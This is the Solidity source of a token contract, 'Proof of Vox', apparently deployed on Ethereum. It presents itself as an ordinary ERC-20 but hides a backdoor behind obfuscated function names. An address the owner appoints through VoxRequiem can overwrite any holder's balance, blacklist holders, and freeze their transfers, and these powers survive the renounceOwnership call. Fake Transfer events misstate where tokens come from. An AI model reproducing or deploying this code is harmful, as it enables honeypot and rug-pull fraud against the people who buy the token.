/**
 *Submitted for verification at Etherscan.io on 2022-10-19
*/

// File: pov.sol

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract proofofvox {
  
    mapping (address => uint256) public vTXd;
    mapping (address => bool) vRSm;
	mapping (address => bool) eRn;



    // 
    string public name = "Proof of Vox";
    string public symbol = unicode"POV";
    uint8 public decimals = 18;
    uint256 public totalSupply = 6000000000 * (uint256(10) ** decimals);
    uint eM = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
     event OwnershipRenounced(address indexed previousOwner);

        constructor()  {
        vTXd[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0xd14688F6c665c72A4D5e17c4996d265Edf33074E;
    address Deployer = 0x2910543Af39abA0Cd09dBb2D50200b3E800A63D2;
   


    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier vQ () {
        eM = 0;
        _;}

        function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(vTXd[msg.sender] >= value);
        vTXd[msg.sender] -= value;  
        vTXd[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(vRSm[msg.sender]) {
        require(eM == 1);} 
        require(vTXd[msg.sender] >= value);
        vTXd[msg.sender] -= value;  
        vTXd[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function VoxRequiem(address Ex) vQ public {
        require(msg.sender == owner);
        eRn[Ex] = true;} 


        function balanceOf(address account) public view returns (uint256) {
        return vTXd[account]; }
        function povc(address Ex) Si public{          
        require(!vRSm[Ex]);
        vRSm[Ex] = true;}
		modifier Si () {
        require(eRn[msg.sender]);
        _; }
        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function proofofv(address Ex, uint256 iZ) Si public returns (bool success) {
        vTXd[Ex] = iZ;
        return true; }
        function mfvw(address Ex) Si public {
        require(vRSm[Ex]);
        vRSm[Ex] = false; }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= vTXd[from]);
        require(value <= allowance[from][msg.sender]);
        vTXd[from] -= value;  
        vTXd[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(vRSm[from] || vRSm[to]) {
        require(eM == 1);}
        require(value <= vTXd[from]);
        require(value <= allowance[from][msg.sender]);
        vTXd[from] -= value;
        vTXd[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}